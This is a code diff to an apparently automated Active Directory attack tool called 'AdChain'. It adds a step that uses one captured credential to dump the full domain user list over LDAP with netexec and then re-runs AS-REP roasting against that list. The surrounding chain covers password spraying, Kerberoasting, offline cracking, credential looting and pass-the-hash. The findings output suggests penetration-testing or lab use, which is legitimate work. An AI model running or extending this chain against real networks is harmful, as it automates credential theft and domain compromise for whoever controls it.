@@ -101,6 +101,7 @@ class AdChain:
         cwd = os.getcwd()
         steps = [self._step_guest_and_users, self._step_enum_users,
                  self._step_asrep_roast, self._step_spray_userpass,
+                 self._step_authenticated_enum,
                  self._step_kerberoast_crack, self._step_reuse_and_loot,
                  self._step_pth_and_goal]
         try:
@@ -196,11 +197,13 @@ class AdChain:
         af = self.wd / "asrep.txt"
         af.write_text("\n".join(hashes) + "\n", encoding="utf-8")
         self._log(f"AS-REP roasted {len(hashes)} account(s) (no pre-auth); cracking")
-        self.state["findings"].append(
-            ("AS-REP roastable account(s) (Kerberos pre-auth disabled)", "High",
-             "Accounts without Kerberos pre-authentication let an unauthenticated "
-             "attacker request a crackable AS-REP hash and recover the password "
-             "offline."))
+        if not self.state.get("_asrep_finding"):   # add the finding only once
+            self.state["_asrep_finding"] = True
+            self.state["findings"].append(
+                ("AS-REP roastable account(s) (Kerberos pre-auth disabled)", "High",
+                 "Accounts without Kerberos pre-authentication let an unauthenticated "
+                 "attacker request a crackable AS-REP hash and recover the password "
+                 "offline."))
         # map cracked password back to its username (embedded in the hash line)
         cracked = set(self._crack(af, fmt="krb5asrep"))
         for h in hashes:
@@ -231,6 +234,29 @@ class AdChain:
             if user.lower() == "guest" or not pw:
                 continue
             self._add_cred(user, pw, note="username==password")
+
+    # 2b) once we hold ANY credential, pull the COMPLETE user list -----------
+    def _step_authenticated_enum(self) -> None:
+        """A hardened DC blocks unauthenticated enumeration, so the initial user
+        list is just the well-known low-RID accounts. The moment we hold a
+        credential (seeded or sprayed), do an authenticated LDAP dump to get the
+        FULL user list, then AS-REP roast that expanded list."""
+        cred = self._first_cred()
+        if not cred or not self.domain:
+            return
+        res = self.run("netexec_ldap", target=self.target, domain=self.domain,
+                       username=cred[0], password=cred[1], action="--users")
+        users = re.findall(r"LDAP\s+\S+\s+\d+\s+\S+\s+(\S+)\s+\d{4}-\d{2}-\d{2}",
+                           _ru(res))
+        users = sorted({u for u in users if u.lower() not in
+                        ("username", "guest", "krbtgt") and not u.endswith("$")})
+        if len(users) > len(self.state.get("users", [])):
+            uf = self.wd / "users.txt"
+            uf.write_text("\n".join(users) + "\n", encoding="utf-8")
+            self.state["userfile"] = str(uf)
+            self.state["users"] = users
+            self._log(f"authenticated enum: expanded to {len(users)} domain users")
+            self._step_asrep_roast()   # re-roast the full list
 
     # 3) Kerberoast with a foothold, then crack offline --------------------
     def _step_kerberoast_crack(self) -> None:
